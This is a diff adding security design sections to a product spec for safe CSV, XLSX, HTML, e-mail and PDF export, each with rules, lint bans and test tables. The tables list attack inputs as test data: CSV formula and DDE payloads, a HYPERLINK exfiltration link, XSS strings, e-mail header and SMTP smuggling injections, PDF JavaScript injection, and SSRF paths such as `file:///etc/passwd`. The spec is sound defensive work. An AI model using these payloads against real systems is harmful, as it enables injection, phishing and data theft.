+   TAB inside a quoted field is the documented "Excel-resistant mitigation (observed behavior)"
+   ([WSTG-INJT-21][wstg-csv]). The TAB is invisible in Excel. Its cost is also the WSTG's: it
+   becomes part of the data, so rule 5 reverses it.
+3. **TAB is never a delimiter.** It is the neutraliser, and a TAB-delimited file would turn it into
+   a cell break (CSV-16). Comma is the default; semicolon is for list-separator-`;` locales.
+4. **UTF-8 with BOM by default.** Excel needs the BOM to read UTF-8 `[UNVERIFIED — lab]`. The BOM
+   comes before the header, so a header label like `sep=;` is never the file's first bytes. The
+   label is quoted anyway (CSV-13).
+5. **Reversible.** The prefix rule is a bijection: a value that already starts with TAB is a lead,
+   so it gets a TAB too (CSV-08). `Reader` therefore restores the original exactly: it drops one
+   leading TAB from a field when the rest of the field classifies as `FormulaLead`. FF-SP5 checks
+   the property `Read(Write(v)) == v` for all corpus inputs and fuzz values. Without the reader, a
+   customer who exports, edits in Excel and re-imports through bulk CSV (E2.3) would write
+   `\t+1 555 0100` into `telephoneNumber`.
+6. **Multi-valued attributes** are joined with `; ` into one cell. Only position 0 is classified.
+   Inner positions are protected by rule 1 for quote-aware readers. A reader that is not
+   quote-aware is a residual (§12.8).
+7. **Caps (O7).** At the cap, a cell is cut and gets the marker; the export fails with
+   `RowCapExceeded` above the row cap.
+
+| ID | Input value (comma delimiter) | Expected field bytes | Why |
+| --- | --- | --- | --- |
+| CSV-01 | `=1+1` | `"\t=1+1"` | basic neutralisation |
+| CSV-02 | `=HYPERLINK("http://example.invalid/?q="&A1,"Click")` | `"\t=HYPERLINK(""http://example.invalid/?q=""&A1,""Click"")"` | exfiltration link ([WSTG][wstg-csv]) |
+| CSV-03 | `=cmd\|' /C calc'!A0` | `"\t=cmd\|' /C calc'!A0"` | DDE command |
+| CSV-04 | `@SUM(1+9)*cmd\|' /C calc'!A0` | `"\t@SUM(1+9)*cmd\|' /C calc'!A0"` | DDE behind `@` |
+| CSV-05 | `-2+3+cmd\|' /C calc'!A0` | `"\t-2+3+cmd\|' /C calc'!A0"` | DDE behind `-` |
+| CSV-06 | `＝1+1` · `﹦1+1` | `"\t＝1+1"` · `"\t﹦1+1"` | full-width and small-form equals |
+| CSV-07 | `​=1+1` | `"\t​=1+1"` | invisible lead; data kept |
+| CSV-08 | `\t=1+1` | `"\t\t=1+1"` | already TAB-led: prefixed again (bijection) |
+| CSV-09 | `a","=1+1` | `"a"",""=1+1"` | quote breakout stays one field |
+| CSV-10 | `a,=1+1` · `a;=1+1` | `"a,=1+1"` · `"a;=1+1"` | delimiter breakout stays one field, for both delimiters |
+| CSV-11 | `a\r\n=1+1` | `"a\r\n=1+1"` | row breakout stays one record |
+| CSV-12 | `"=1+1` | `"""=1+1"` | after parsing, the cell starts with `"`, so no prefix is needed |
+| CSV-13 | header label `sep=;` | the BOM, then `"sep=;"` | the delimiter directive cannot take effect (FF-SP11) |
+| CSV-14 | a 40 000-character value | 32 767 UTF-16 units ending `… [truncated: 40000 chars]`; `truncated = 1` | O7 |
+| CSV-15 | multi-valued `["a", "=1+1"]` | `"a; =1+1"` | one cell; position 0 decides |
+| CSV-16 | `CSVOptions{Delimiter: Tab}` | does not compile: no `Tab` constant; the wire form is error `DelimiterNotAllowed` | rule 3 |
+| CSV-17 | lab: CSV-01 to -07 outputs opened in Excel, saved as CSV, reopened | every cell is still text | WSTG save/reopen regression (FF-SP11) `[UNVERIFIED — lab]` |
+| CSV-18 | lab: CSV-09 to -11 opened in Excel and LibreOffice with list separator `;` | no cell starts with a lead | delimiter mismatch (FF-SP11) |
+| CSV-19 | `CSVOptions{Delimiter: Semicolon}`, value `a;=1+1` | `"a;=1+1"` | quoting holds under the alternative delimiter |
+| CSV-20 | `+1 555 0100` | `"\t+1 555 0100"` | benign phone number: the display cost of rule 2 |
+| CSV-21 | typed `Int64(-5)` | `-5` | typed numbers are not text |
+| CSV-22 | `Smith, John` | `"Smith, John"` | plain quoting |
+| CSV-23 | `Reader`: `"\t=1+1"` · `"\t\t=1+1"` | `=1+1` · `\t=1+1` | the inverse restores the data (rule 5) |
+
+**Lint (bans the raw writer).**
+- `encoding/csv` may be imported only in `export/csv` (FF-SP1). Elsewhere, `strings.Join` with a
+  `","` or `";"` literal written to an `io.Writer` or `http.ResponseWriter` is a finding (FF-SP3).
+- The literals `"text/csv"` and `".csv"` may appear only in `export/csv` and `platform/httpx`
+  (FF-SP3), so a feature cannot serve a hand-made CSV.
+- In `web/`: no CSV/XLSX libraries in `package.json` (`papaparse` unparse, `xlsx`/SheetJS,
+  `exceljs`, `json-2-csv` and the like), and no `new Blob(` with a `text/csv` or
+  `spreadsheetml` type (FF-SP3). exceljs ≤ 4.4.0 itself carried this bug ([CVE-2026-78209][cve-exceljs]).
+
+### 12.4 `export/xlsx` — XLSX writer
+
+```
+xlsx.NewWriter(w: io.Writer, o: XLSXOptions{Sheet: SheetName, Title: DisplayText}) -> Writer   // streaming
+xlsx.ParseSheetName(s: string) -> SheetName     // maps per O3; caps at 31 UTF-16 units; never empty
+Writer.Header(cols) / Writer.Row(cells) -> Error ; Writer.Close() -> RenderReport
+```
+
+There is no formula, hyperlink, comment, image, data-validation, defined-name, external-link,
+connection or macro API.
+
+**Rules.**
+
+1. **Text is always a string cell** (`t="inlineStr"` or `t="s"`). A formula exists in SpreadsheetML
+   only as an `<f>` element, and the writer never emits one. Data is never changed: XLSX needs no
+   TAB prefix.
+2. **Lead-classified strings get a `quotePrefix="1"` style.** `quotePrefix` marks a cell as if the
+   user had typed a leading `'` ([Open XML `CellFormat.QuotePrefix`][oxml-quoteprefix]). It is meant
+   to keep the cell text when an admin edits it (F2, Enter). Whether Excel honours it on edit is
+   `[UNVERIFIED — lab]` (XL-18).
+3. **Escape for ST_Xstring.** Characters XML 1.0 cannot carry (C0 except TAB and LF, U+FFFE, U+FFFF)
+   and CR become `_xHHHH_`. A literal `_xHHHH_` in data has its underscore escaped as `_x005F_`
+   ([MS-OI29500 ST_Xstring][oi29500-xstring]; excelize implements the same rule in `bstrMarshal`,
+   [excelize lib.go][excelize-lib]). Without this, `_x003D_1+1` displays as `=1+1`, and a stray
+   U+000B makes the file unreadable: a denial of service by one attribute.
+4. **Workbook shape is fixed:** content type `…sheet.main+xml`, never macro-enabled. There are no
+   `xl/externalLinks/`, `xl/connections.xml`, `xl/queryTables/` or `xl/vbaProject.bin` parts, no
+   `<definedName>`, no `<hyperlink>` and no custom document properties. `docProps/core.xml`
+   `dc:title` holds the report title, XML-escaped.
+5. **Typed numbers must be finite.** NaN and ±Inf are error `NonFiniteNumber`; Excel cannot
+   represent them.
+6. **Library.** A streaming writer such as excelize (BSD-3-Clause, [licence][excelize-licence]) is
+   a candidate. It is not yet in the licence register; the T-0101 owner adds it and records the
+   verdict. Only `export/xlsx` imports it.
+
+| ID | Input | Expected | Why |
+| --- | --- | --- | --- |
+| XL-01 | `=1+1` | `<c t="inlineStr" s="Q"><is><t>=1+1</t></is></c>`; style `Q` has `quotePrefix="1"`; no `<f>` | rule 1, 2 |
+| XL-02 | `=HYPERLINK("http://example.invalid/","x")` | string cell; no `<f>`; no `<hyperlinks>`, no hyperlink relationship | O5 |
+| XL-03 | `＝1+1` · `＠SUM(1,1)` | string cell with `quotePrefix` | full-width leads |
+| XL-04 | `\t=1+1` | string cell with `quotePrefix`; text keeps its single literal TAB | no CSV prefix in XLSX |
+| XL-05 | `_x003D_1+1` | `<t>_x005F_x003D_1+1</t>`; Excel shows `_x003D_1+1` | escape spoofing (rule 3) |
+| XL-06 | `a\x0Bb` · `a\x01b` | `a_x000B_b` · `a_x0001_b`; well-formed XML | file-breaking control characters |
+| XL-07 | `a\rb` | `a_x000D_b` | CR is escaped ([MS-OI29500][oi29500-xstring]) |
+| XL-08 | `a￾b` | `a_xFFFE_b`; well-formed XML | non-characters |
+| XL-09 | `</t></is><f>1+1</f>` | `&lt;/t&gt;&lt;/is&gt;&lt;f&gt;1+1&lt;/f&gt;` in one `<t>`; no `<f>` | XML structure injection |
+| XL-10 | `&xxe;` · `<!DOCTYPE x [<!ENTITY a "b">]>` | escaped text; the workbook has no DTD | entity injection |
+| XL-11 | a 40 000-character value | 32 767 UTF-16 units ending `… [truncated: 40000 chars]`; `truncated = 1`; Excel opens it without repair | the cell limit ([Excel limits][excel-limits]) |
+| XL-12 | `😀` straddling the cut point | cut before the surrogate pair, never inside it | well-formed UTF-8/16 |
+| XL-13 | sheet name `Q1/Q2:[draft]*?` · `History` · `'x'` | `Q1_Q2__draft___` · `History_` · `_x_` | forbidden characters; reserved name `[UNVERIFIED — lab]`; leading and trailing apostrophes |
+| XL-14 | 1 048 576 data rows | error `RowCapExceeded`, raised before writing | O7 |
+| XL-15 | `Float64(NaN)` · `Float64(+Inf)` | error `NonFiniteNumber` | rule 5 |
+| XL-16 | static, every XLSX produced by the corpus | no `<f`, `<hyperlink`, `<definedName`, `externalLinks/`, `vbaProject.bin`, `connections.xml` or `queryTables/`; main content type `…sheet.main+xml` | rule 4 (FF-SP10) |
+| XL-17 | report title `=1+1` | `dc:title` is `=1+1`, XML-escaped; no custom properties | metadata is data too |
+| XL-18 | lab: XL-01 opened in Excel, cell edited (F2, Enter) | the cell stays text | rule 2 (FF-SP11) `[UNVERIFIED — lab]` |
+| XL-19 | `+1 555 0100` | string cell with `quotePrefix`; text unchanged | benign data, no display cost |
+| XL-20 | `Smith, John` | string cell, default style | control |
+| XL-21 | typed `Int64(-5)` | `<c t="n"><v>-5</v></c>` | typed numbers |
+
+**Lint.** The XLSX library may be imported only in `export/xlsx` (FF-SP1). Inside that package,
+FF-SP2 bans the library's formula, hyperlink, VBA, defined-name, comment and picture setters
+(excelize: `SetCellFormula`, `SetCellHyperLink`, `AddVBAProject`, `SetDefinedName`, `AddComment`,
+`AddPicture`, `Cell{Formula: …}`). It also bans the type-inferring `SetCellValue`, so every cell
+has an explicit type.
+
+### 12.5 HTML: server templates, HTML export, message templates, download headers, console rules
+
+```
+htmlx.Render(w, name: TemplateName, data: any) -> Error   // html/template only; templates compiled at init from embed.FS
+htmlx.SystemURL(r: Route, q: url.Values) -> template.URL   // the only producer of template.URL; base from config
+htmlx.Document(t: Table, meta: ReportMeta) -> io.Reader    // standalone HTML export (rule 4)
+msgtpl.Parse(adminText: string, reg: PlaceholderRegistry) -> MessageTemplate | Error
+msgtpl.RenderText(t, vals) -> string ; msgtpl.RenderHTML(t, vals) -> HTML   // both escape per context
+httpx.Attachment(w, base: string, f: Format, body: io.Reader)   // the only setter of Content-Disposition
+```
+
+**Server rules (tier S).**
+
+1. **`html/template` only.** It assumes "template authors are trusted, that Execute's data
+   parameter is not" and keeps "structure preservation" and "code effect" against untrusted data
+   ([html/template][go-htmltemplate]). `text/template` is banned in product code: the e-mail text
+   part comes from `msgtpl`, not from it.
+2. **Typed strings are trust declarations.** `template.HTML`, `HTMLAttr`, `JS`, `JSStr`, `CSS`,
+   `URL` and `Srcset` "carry safe content that is exempted from escaping" ([html/template][go-htmltemplate]).
+   They may be constructed only inside `htmlx`. There the one constructor is `SystemURL`, which
+   joins the configured base URL to a route constant with `url.Values`. No data reaches `href` or
+   `src`. Unsafe URLs that do reach a URL context render as `#ZgotmplZ`, which is a backstop and
+   not the design (HT-03).
+3. **Templates are code.** They are parsed only from `embed.FS` or constant strings. Template files
+   contain no `<script>`, no `on…=` attribute, no `javascript:` and no action inside `<style>` or
+   `style=` (FF-SP10 static check).
+4. **The HTML export is a standalone document with no active content.** Its first `<head>` element
+   is `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'sha256-…'; img-src data:">`.
+   It has no `<script>` and no external URL, so opening it makes no network request: no tracking
+   and no SSRF from the reader's machine. Every data value is wrapped in `<bdi>` (O6).
+5. **Downloads are attachments, never inline.** `httpx.Attachment` sets the following:
+   `Content-Disposition: attachment; filename="<ASCII fallback>"; filename*=UTF-8''<pct-encoded>`
+   per [RFC 6266][rfc6266] and [RFC 8187][rfc8187]; `X-Content-Type-Options: nosniff`; and, for
+   HTML, `Content-Security-Policy: sandbox; default-src 'none'; style-src 'sha256-…'; img-src data:`
+   ([MDN CSP sandbox][mdn-csp-sandbox]). An HTML export served inline from our origin would be
+   stored XSS against the console. The file name is the O3-mapped base plus an extension taken from
+   the format enum, never from the name, so `invoice.pdf.exe` exported as CSV becomes
+   `invoice.pdf.exe.csv`.
+6. **Admin-editable message text is not a template language.** Notification texts (ADM-204) are
+   admin-editable, and a delegated admin who could write `html/template` source could script other
+   admins' mail. `msgtpl` therefore parses plain text with `{{name}}` placeholders, paragraphs,
+   bold, and links whose target is a `Route` constant. A placeholder name must be in the module's
+   registry, and secret attributes are never in a registry (§3.7). Every other `{{…}}` is error
+   `UnknownPlaceholder`. Raw HTML in the text is text.
+7. **JSON responses keep `encoding/json`'s HTML escaping.** `Encoder.SetEscapeHTML(false)` is
+   banned in product code ([encoding/json][go-json-escape]), and API responses carry `nosniff`.
+
+**Console rules (tier W).** Tier W implements no encoder (§2.1). It follows these rules:
+
+- **W1** React's default text rendering only. Banned: `dangerouslySetInnerHTML`; assignment to
+  `innerHTML` or `outerHTML`; `insertAdjacentHTML`; `document.write`; `eval`; `new Function`; string
+  arguments to `setTimeout`/`setInterval`; `srcDoc`. Also banned are HTML or Markdown renderers
+  that take strings: `html-react-parser`, and `react-markdown` with raw HTML.
+- **W2** `href` and `src` take only literals, router links, or a server-built `SafeLink` from the
+  API. User-editable URL attributes (`wWWHomePage`, `url`) display as text, never as anchors. React
+  itself replaces `javascript:` URLs with one that throws ([React sanitizeURL][react-sanitizeurl]),
+  but that is the backstop.
+- **W3** Content-Security-Policy on every console and portal page: `default-src 'self'`,
+  `script-src 'self'`, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'` and
+  `require-trusted-types-for 'script'`. Trusted Types makes the W1 sinks throw on strings at run
+  time. It has been Baseline across major browsers since Firefox shipped it in February 2026
+  ([URIports][tt-support]; [web.dev][tt-webdev]) `[UNVERIFIED — check MDN compat at build]`. The
+  header itself belongs to the HTTP-server ticket. T-0029 states the requirement and HT-22 proves it.
+- **W4** Table cells, detail panes, toasts and dialog titles wrap data in `<bdi>` or `dir="auto"`
+  (O6). These are component-designer primitives.
+- **W5** The console never assembles download content. "Export" and "copy rows" call the server,
+  which returns a P7 artefact. Copying a **single** value to the clipboard copies it raw, because
+  the admin asked for that value. Pasting it into a spreadsheet is a residual (§12.8).
+
+| ID | Input | Expected | Why |
+| --- | --- | --- | --- |
+| HT-01 | `<td>{{.V}}</td>`, V = `<script>alert(1)</script>` | `<td>&lt;script&gt;alert(1)&lt;/script&gt;</td>` | element context |
+| HT-02 | `<td title="{{.V}}">`, V = `" onmouseover="alert(1)` | `title="&#34; onmouseover=&#34;alert(1)"` | attribute context |
+| HT-03 | `<a href="{{.V}}">`, V = `javascript:alert(1)` · `JaVaScRiPt:alert(1)` · `\x01javascript:alert(1)` | `href="#ZgotmplZ"` | URL-context backstop ([html/template][go-htmltemplate]) |
+| HT-04 | V = `</td></tr></table><img src=x onerror=alert(1)>` | fully escaped; DOM element count equals the template's | table breakout |
+| HT-05 | static: `template.HTML(x)` · `template.URL(x)` · `template.JS(x)` outside `htmlx` | build fails (FF-SP2) | rule 2 |
+| HT-06 | static: `text/template` imported in product code | build fails (FF-SP2) | rule 1 |
+| HT-07 | static: `template.New(n).Parse(s)` with `s` neither constant nor `embed.FS` | build fails (analyzer `tmplconst`, FF-SP2) | rule 3 |
+| HT-08 | static: an embedded template containing `<script` · `onclick=` · `{{.X}}` inside `<style>` | build fails (FF-SP10) | rule 3 |
+| HT-09 | `msgtpl.Parse("Hi <img src=x onerror=alert(1)> {{displayName}}")` | a text node with escaped markup, then a placeholder | rule 6 |
+| HT-10 | `msgtpl.Parse` of `{{template "x"}}` · `{{unicodePwd}}` · `{{ms-Mcs-AdmPwd}}` | error `UnknownPlaceholder` | no template language; no secrets |
+| HT-11 | HTML export, V = `<img src="https://evil.example/p.png">` | escaped text; CSP meta is the first head element; no `<script>`; no external URL | rule 4 (FF-SP10) |
+| HT-12 | HTML export, V = `‮gnp.exe` | `<bdi>‮gnp.exe</bdi>` | O6 |
+| HT-13 | download base `Q3\r\nSet-Cookie: a=b`, CSV | `filename="Q3__Set-Cookie_ a=b.csv"; filename*=UTF-8''Q3__Set-Cookie_%20a%3Db.csv` | header injection |
+| HT-14 | base `../../etc/passwd`, CSV | `.._.._etc_passwd.csv` | path traversal on save |
+| HT-15 | base `invoice.pdf.exe`, CSV | `invoice.pdf.exe.csv` | the format fixes the extension |
+| HT-16 | base `‮fdp.exe`, PDF | `_fdp.exe.pdf` | RLO extension spoofing |
+| HT-17 | base `report"; filename="x.exe`, CSV | `filename="report_; filename=_x.exe.csv"`; `filename*` percent-encodes `;`, space and `=` | parameter injection |
+| HT-18 | integration: GET of an HTML export | `attachment`, `nosniff`, `CSP: sandbox; default-src 'none'…`; never `inline` | rule 5 |
+| HT-19 | static `web/`: `dangerouslySetInnerHTML` · `.innerHTML =` · `.outerHTML =` · `insertAdjacentHTML(` · `document.write(` · `eval(` · `new Function(` · `setTimeout("…")` · `srcDoc=` | lint fails (FF-SP3) | W1 |
+| HT-20 | static `web/`: `<a href={u.wWWHomePage}>` · `<img src={x.url}>` | lint fails (FF-SP3) | W2 |
+| HT-21 | Playwright: `displayName` = `<img src=x onerror=window.__x=1>` shown in the users table, details pane, a toast, a confirm dialog and the page title | rendered as text; `window.__x` undefined; no CSP or Trusted Types violations | stored XSS (TM-TB1-T4) |
+| HT-22 | Playwright: the page evaluates `document.body.innerHTML = "<b>x</b>"` | throws `TypeError` (Trusted Types enforced) | W3 |
+| HT-23 | V = `Smith & Sons <Ltd>` | `Smith &amp; Sons &lt;Ltd&gt;` | control |
+| HT-24 | V = `José 😀` | unchanged UTF-8 | control |
+
+**Lint.**
+- Go (FF-SP2): `text/template` import, typed-string conversions outside `htmlx`, `tmplconst`,
+  `SetEscapeHTML(false)`, and `Header().Set("Content-Disposition", …)` outside `httpx`.
+- Go (FF-SP3): HTML-shaped literals (`"<td"`, `"<a href="`, `"<script"`) combined with
+  concatenation or formatting outside `htmlx`.
+- ESLint in `web/`: `react/no-danger`, `react/jsx-no-script-url`, `no-eval`, `no-implied-eval`,
+  `no-new-func`, `no-restricted-properties` (`innerHTML`, `outerHTML`, `insertAdjacentHTML`,
+  `write`), and a custom rule for W2 (`href`/`src` must be a literal, a router link or
+  `SafeLink.href`).
+
+### 12.6 `notify/mail` — e-mail composer
+
+```
+mail.ParseRecipient(addr: string, displayName: string) -> Recipient | Error   // addr from AD `mail` or config
+mail.Compose(m: Message{To: []Recipient, Subject: MessageTemplate, Body: MessageTemplate,
+             Attachments: []Attachment{Base: string, Format, Content: io.Reader}},
+             vals: Values, cfg: MailConfig) -> SealedMessage | Error
+notify.Send(m: SealedMessage)          // the SMTP channel accepts nothing else (T-0095)
+```
+
+`From`, `Sender`, `Reply-To` and `Return-Path` come only from `MailConfig`. The API has no way to
+set them from data.
+
+**Rules.**
+
+1. **One address per recipient.** `addr` must parse as exactly one bare addr-spec (`net/mail`
+   `ParseAddress`, then a check that it has no display name, group or comment). Lists, groups,
+   display-name forms and any CR/LF are errors. Go's `net/smtp` already refuses CR/LF in envelope
+   addresses ([`validateLine`][go-smtp-src]); we refuse them earlier and typed. Which estates let
+   users write their own `mail` attribute, and so redirect their own notices, is a feature-level
+   concern for the SSPR and notification specs, not encoding.
+2. **Headers are built only by the composer.** Data enters headers only as the subject (from
+   `msgtpl`) and recipient display names. Both are O3-mapped to a single line, capped (O7) and
+   always encoded as RFC 2047 encoded-words. Go's `mime` encoder would leave plain ASCII unencoded
+   ([mime `needsEncoding`][go-mime-src]); we always encode, so a literal `=?utf-8?…?=` in a
+   `displayName` shows as text and not as a decoded name. Folded lines never exceed RFC 5322's 998
+   octets ([RFC 5322 §2.1.1][rfc5322]).
+3. **Bodies are always quoted-printable or base64.** `multipart/alternative` carries a text part
+   and an HTML part, both from the same `MessageTemplate` (§12.5 rule 6). With a transfer encoding
+   no bare CR or LF reaches the wire, and no data line can be `.` alone. That closes the SMTP
+   smuggling class, where receivers disagree about `<LF>.<LF>`-style end-of-data sequences
+   ([CERT-EU 2023-098][smtp-smuggling]).
+4. **Links and images.** Links come only from `htmlx.SystemURL`. A placeholder whose value is a URL
+   from data can appear only as text (`LinkTargetNotSystem`). There are no remote images and no
+   tracking pixels; the configured logo is an inline `cid:` part.
+5. **Attachments** are P7 artefacts (CSV, XLSX, PDF). Their names use the RFC 2231 `filename*`
+   parameter with the §12.5 rule 5 mapping. Above the size cap, the mail carries a `SystemURL` to
+   the stored export, which needs sign-in (T-0103), instead of the file.
+
+| ID | Input | Expected | Why |
+| --- | --- | --- | --- |
+| EM-01 | subject `Password expiry: {{displayName}}`, displayName = `Bob\r\nBcc: victim@example.net` | one `Subject:` header decoding to `Password expiry: Bob��Bcc: victim@example.net`; the header set is exactly the one we built | header injection |
+| EM-02 | `mail` = `a@corp.example, b@evil.example` | error `NotSingleAddress`; nothing sent; delivery record `failed` | recipient list injection |
+| EM-03 | `mail` = `a@corp.example\r\nBcc: z@evil.example` | error `InvalidAddress` | CRLF in an address |
+| EM-04 | `mail` = `undisclosed:a@corp.example,b@evil.example;` | error `NotSingleAddress` | group syntax |
+| EM-05 | `mail` = `"IT Helpdesk" <evil@evil.example>` | error `NotBareAddress` | a display name smuggled through `mail` |
+| EM-06 | displayName = `=?utf-8?b?SVQgSGVscGRlc2s=?=` | the client shows the literal `=?utf-8?b?…?=` text, not "IT Helpdesk" | encoded-word spoofing |
+| EM-07 | body value `x\r\n.\r\nMAIL FROM:<ceo@corp.example>` · `x\n.\nRSET` · `x\r.\r` | parts are QP or base64; on the wire, no line is `.` alone except our terminator; no bare CR or LF | SMTP smuggling |
+| EM-08 | HTML-part value `<a href="https://evil.example/reset">Reset now</a>` | escaped text; the part's only anchors are `SystemURL` links | phishing link injection |
+| EM-09 | template link target `{{wWWHomePage}}` | error `LinkTargetNotSystem` | rule 4 |
+| EM-10 | template text `<img src="https://tracker.example/p.gif">` | rendered as text; the message has no remote reference | rule 4 |
+| EM-11 | attachment base `x\r\nContent-Type: text/html`, CSV | `filename*=utf-8''x__Content-Type_%20text_html.csv`; exactly one attachment part | MIME parameter injection |
+| EM-12 | a 10 000-character subject value | subject capped at 200 characters plus `…`; folded; no line over 998 octets | O7 |
+| EM-13 | static: `net/smtp`, `mime/multipart.NewWriter`, `mime.QEncoding`/`BEncoding`, `net/textproto.Writer` outside `notify/mail` | build fails (FF-SP1/FF-SP2) | raw writer banned |
+| EM-14 | static: literals `"Subject:"`, `"Bcc:"`, `"Content-Type:"` or `"\r\n"` with concatenation or formatting outside `notify/mail` | build fails (FF-SP3) | hand-built headers |
+| EM-15 | static: setting `From`/`Sender`/`Reply-To` from a `Values` entry | does not compile: no such API | rule 2 |
+| EM-16 | `mail` = `a@corp.example` | `To: a@corp.example` | control |
+| EM-17 | displayName = `José Müller` | `To: =?utf-8?q?Jos=C3=A9_M=C3=BCller?= <jose@corp.example>` | control |
+
+**Residual.** A value such as `Visit https://evil.example to unlock` arrives as text from a sender
+the admin trusts, and many clients auto-link URLs in text. We cannot neutralise that without
+corrupting data (§12.8).
+
+### 12.7 `export/pdf` — PDF writer
+
+```
+pdf.NewWriter(w: io.Writer, o: PDFOptions{Title: string, Orientation, Font: EmbeddedFont}) -> Writer
+Writer.Header(cols) / Writer.Row(cells) -> Error ; Writer.Close() -> RenderReport
+```
+
+There is no link, annotation, JavaScript, attachment, form, outline-action or page-import API.
+
+**Rules.**
+
+1. **Draw text, never interpret markup.** Data enters as text runs placed by a PDF library. It never
+   passes through an HTML or Markdown engine. HTML-to-PDF converters run a browser engine that
+   fetches what the markup references: `<iframe src="file:///etc/passwd">` and cloud metadata URLs
+   are the standard SSRF and local-file-read routes ([Intigriti][pdf-ssrf]). activeDIQ's server is
+   Tier-0-adjacent and holds sealed connector secrets, so adopting one would need an ADR and a
+   security-architect review. Even then it would run with no network and no file access.
+2. **String encoding is the library's, checked by us.** Text is written as hex strings or as
+   properly escaped literal strings (`\(`, `\)`, `\\`). FF-SP10 extracts each run's text and
+   compares it with the input, and checks that a cell contributes the same operator sequence
+   whatever its content.
+3. **No actions.** The catalog, pages and annotations contain no `/JavaScript`, `/JS`,
+   `/OpenAction`, `/AA`, `/Launch`, `/URI`, `/SubmitForm`, `/ImportData`, `/EmbeddedFile`,
+   `/RichMedia` or `/XFA`. This is checked with a PDF parser over objects, not by grepping, because
+   the strings can legitimately occur inside text (FF-SP10).
+4. **Metadata is data.** `/Title` is a UTF-16BE hex string. The Info dictionary has only the keys
+   we set; there is no XMP from data.
+5. **Visible controls.** Cc and Cf characters are drawn as `⟨U+XXXX⟩` (O3). A PDF has no bidi
+   algorithm, so an RLO would otherwise be invisible and show as missing glyphs. A glyph missing
+   from the embedded font is drawn as the font's fallback glyph, never dropped.
+6. **Library.** Candidates: `signintech/gopdf` (MIT, active) and `johnfercher/maroto` v2 (MIT,
+   active; it depends on `phpdave11/gofpdf` and `pdfcpu`). `go-pdf/fpdf` is archived (checked
+   through the GitHub API, 2026-10-02) and is out. The choice and the licence-register entry belong
+   to the T-0102 owner. Page import (`gofpdi`) is never called: we do not merge external PDFs.
+
+| ID | Input | Expected | Why |
+| --- | --- | --- | --- |
+| PDF-01 | `) Tj ET BT /F1 99 Tf (pwned` | extracted text equals input; the cell's operators are the same as for `x` | content-stream injection |
+| PDF-02 | the characters `\` · `\(` · `\\)` (backslashes literal here) | extracted text equals input | string-escape edge cases |
+| PDF-03 | `/JavaScript (app.alert(1))` · `/OpenAction` | extracted text equals input; the object scan finds no rule-3 names | name injection |
+| PDF-04 | `<iframe src="file:///etc/passwd">` · `<img src="http://169.254.169.254/">` | drawn as text; the render makes no file or network access | no markup engine (rule 1) |
+| PDF-05 | title `x)>>/OpenAction<</S/JavaScript/JS(app.alert(1))>>` | `/Title <FEFF…>` hex; the Info dictionary has only our keys | metadata injection |
+| PDF-06 | `‮gpj.exe` | drawn as `⟨U+202E⟩gpj.exe` | bidi spoofing |
+| PDF-07 | `a\x07b` · `a\x1Bb` | `a⟨U+0007⟩b` · `a⟨U+001B⟩b` | invisible controls |
+| PDF-08 | `https://evil.example/reset` | text only; no `/Annots` link | no links from data (viewer auto-linking is a residual) |
+| PDF-09 | a 32 767-character cell | wrapped; capped at 200 lines plus marker; bounded render time | O7 |
+| PDF-10 | 1 000 000 rows | error `RowCapExceeded`, raised before writing | O7 |
+| PDF-11 | static: PDF library imported outside `export/pdf`; its link, annotation, JavaScript, attachment, form or page-import APIs called | build fails (FF-SP1/FF-SP2) | rule 3, 6 |
+| PDF-12 | static: `chromedp`, `go-rod`, `playwright-go` or a wkhtmltopdf wrapper in product `go.mod`; a browser in the `proc` allowlist | build fails (FF-SP1, §6.3) | rule 1 |
+| PDF-13 | `漢字 😀` with no glyph in the embedded font | fallback glyphs drawn; extracted text equals input | control |
+| PDF-14 | `Smith & Sons` | extracted text equals input | control |
+
+### 12.8 Residual risks
+
+| Residual | Why it remains | Owner |
+| --- | --- | --- |
+| A CSV opened by a reader that is not quote-aware (naive split) | Quoting is the only portable defence for inner positions. Changing inner data would break fidelity | Accepted. The docs say to open CSVs in a spreadsheet or use XLSX |
+| A spreadsheet that trims a leading TAB and then evaluates | WSTG lists TAB as a trigger and recommends it as a prefix. If FF-SP11 finds LibreOffice or Excel trimming, the neutraliser becomes TAB plus `'` and rule 5 is updated | security-architect, on the first FF-SP11 run |
+| A single value copied from the console and pasted into a spreadsheet | The admin copied that value on purpose. W5 covers multi-row copy | Accepted, low |
+| URL text auto-linked by mail clients and PDF viewers | The text is data; removing it corrupts the report | Accepted; admin-facing mail only |
+| Trusted Types in a browser outside the support matrix | Enforcement is the browser's | Accepted; W1 lint is the primary control |
+
+### 12.9 Corpus, fitness and verification for P7
+
+The new FF-SP4 units are `cellsafe`, `csv`, `xlsx`, `html`, `mail` and `pdf`. Their counts are in
+§8, and FF-SP10 and FF-SP11 are defined there. Lab records (CSV-17, CSV-18, XL-18) carry
+`"kind":"lab"`. FF-SP11 runs them, and their `verified` field records `libreoffice`, `excel` or
+both. Lab-dependent claims in this section are listed in §9.
 
 ## Sources
 
@@ -1238,6 +1791,28 @@ T-0034 (FF-SP4–6, 8) and T-0036 (FF-SP7, implemented inside ADR-0002's `fitnes
 [ps-execpol]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies
 [dotnet-hooks]: https://github.com/dotnet/runtime/blob/main/docs/design/features/host-startup-hook.md
 [dotnet-prof]: https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling
+[owasp-csv]:https://owasp.org/www-community/attacks/CSV_Injection
+[wstg-csv]: https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Injection/21-CSV_Injection.md
+[cve-exceljs]: https://app.opencve.io/cve/CVE-2026-78209
+[excel-limits]: https://support.microsoft.com/en-us/office/excel-specifications-and-limits-1672b34d-7043-467e-8e27-269d656771c3
+[oxml-quoteprefix]: https://learn.microsoft.com/en-us/dotnet/api/documentformat.openxml.spreadsheet.cellformat.quoteprefix
+[oi29500-xstring]: https://learn.microsoft.com/en-us/openspecs/office_standards/ms-oi29500/d34ae755-c53f-4a44-a363-c6dd3ee018a4
+[excelize-lib]: https://github.com/qax-os/excelize/blob/master/lib.go
+[excelize-licence]: https://github.com/qax-os/excelize/blob/master/LICENSE
+[go-htmltemplate]: https://pkg.go.dev/html/template
+[go-json-escape]: https://pkg.go.dev/encoding/json#Encoder.SetEscapeHTML
+[react-sanitizeurl]: https://github.com/facebook/react/blob/main/packages/react-dom-bindings/src/shared/sanitizeURL.js
